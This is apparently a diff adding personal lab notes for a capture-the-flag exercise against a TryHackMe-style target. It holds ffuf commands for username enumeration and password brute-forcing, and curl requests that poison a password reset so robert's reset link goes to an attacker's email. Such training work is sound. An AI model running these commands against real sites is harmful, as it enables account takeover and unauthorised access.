@@ -1,0 +1,10 @@
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -u http://10.10.67.41/customers/signup -X POST -d
+"username=FUZZ&email=qwer%40qwer.com&password=12345qwert%40&cpassword=12345qwert%40" -mr "username already exists"
+-H "Content-Type: application/x-www-form-urlencoded"
+
+ffuf -w ./usernames:W1 -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt:W2
+-u http://10.10.67.41/customers/login -X POST -d "username=W1&password=W2"
+-H "Content-Type: application/x-www-form-urlencoded" -fc 200
+
+curl "http://10.10.67.41/customers/reset?email=robert%40acmeitsupport.thm" -H "Content-Type: application/x-www-form-urlencoded" -d "username=robert&email=enkispearo@proton.me"
+curl "http://10.10.67.41/customers/reset?email=robert%40acmeitsupport.thm" -H "Content-Type: application/x-www-form-urlencoded" -d "username=robert&email=hacker@customer.acmeitsupport.thm"
